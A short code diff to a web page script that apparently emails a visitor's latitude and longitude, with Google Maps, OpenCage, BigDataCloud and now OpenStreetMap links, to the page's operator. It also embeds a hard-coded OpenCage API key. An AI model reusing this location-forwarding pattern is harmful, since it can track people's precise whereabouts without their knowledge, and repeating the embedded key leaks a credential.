@@ -70,7 +70,8 @@
               Subject: new Date(),
               Body: `Link 1 - https://www.google.com/maps/@${latitude},${longitude},16z?hl=en <br>
                      Link 2 - https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=81db787190624dec8ac225bccc0436dc <br>
-                     Link 3 - https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`,
+                     Link 3 - https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en <br>
+                     Click - https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}#map=17/${latitude}/${longitude}`,
             }).then((message) => {
               if (message === "OK") {
                 status.innerText = "Thank You Visit Again";
